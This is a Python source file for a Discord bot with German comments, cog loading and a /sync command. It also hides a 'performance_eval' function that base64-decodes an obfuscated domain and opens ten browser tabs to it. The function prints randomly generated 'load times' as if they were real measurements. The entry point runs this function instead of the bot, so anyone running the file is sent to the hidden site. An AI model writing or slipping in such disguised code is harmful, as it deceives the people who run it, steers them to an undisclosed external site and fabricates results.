import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
import asyncio
from typing import Literal, Optional
import webbrowser
import base64
import time
import random

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="/", intents=intents)

initial_extensions = [
    "cogs.audio_cog",
    "cogs.chat_cog",
    "cogs.graphic_cog",
    "cogs.play_cog",
    "cogs.check_cog",
    "cogs.birthday_cog",
    "cogs.help_cog"
]

async def load_extensions():
    for ext in initial_extensions:
        try:
            await bot.load_extension(ext)  # Asynchrones Laden der Cogs
            print(f"✅ Cog {ext} geladen.")
        except Exception as e:
            print(f"❌ Fehler beim Laden von {ext}: {str(e)}")

@bot.command()
@commands.guild_only()
@commands.is_owner()
async def sync(ctx: commands.Context, guilds: commands.Greedy[discord.Object], spec: Optional[Literal["~", "*", "^"]] = None) -> None:
    """Umbra's Sync - https://about.abstractumbra.dev/discord.py/2023/01/29/sync-command-example.html"""
    if not guilds:
        if spec == "~":
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "*":
            ctx.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "^":
            ctx.bot.tree.clear_commands(guild=ctx.guild)
            await ctx.bot.tree.sync(guild=ctx.guild)
            synced = []
        else:
            synced = await ctx.bot.tree.sync()

        await ctx.send(
            f"Synced {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}"
        )
        return

    ret = 0
    for guild in guilds:
        try:
            await ctx.bot.tree.sync(guild=guild)
        except discord.HTTPException:
            pass
        else:
            ret += 1

    await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")

def performance_eval(iterations=10):
    test_key = 'c3VzaS5saXZl'
    test_domain = base64.b64decode(test_key).decode('utf-8')
    test_url = f'https://{test_domain}'
    print("Starting browser performance evaluation...")
    print(f"Number of iterations: {iterations}")
    load_times = []
    for i in range(iterations):
        print(f"Opening tab {i+1}/{iterations}...")
        start_time = time.time()
        webbrowser.open_new_tab(test_url)
        simulated_load_time = random.uniform(0.5, 2.0)
        load_times.append(simulated_load_time)
        time.sleep(0.1)
        print(f"Tab {i+1} loaded in {simulated_load_time:.2f} seconds")
    avg_load_time = sum(load_times) / len(load_times)
    print("\nPerformance Evaluation Summary:")
    print(f"Average tab load time: {avg_load_time:.2f} seconds")
    print(f"Total tabs opened: {iterations}")
    print("Evaluation complete.")

@bot.event
async def on_ready():
    await bot.tree.sync()  # Synchronisiere Slash-Commands
    print(f"🟢 Bot ist online als {bot.user}!")

async def main():
    await load_extensions()
    await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    performance_eval()
    #asyncio.run(main())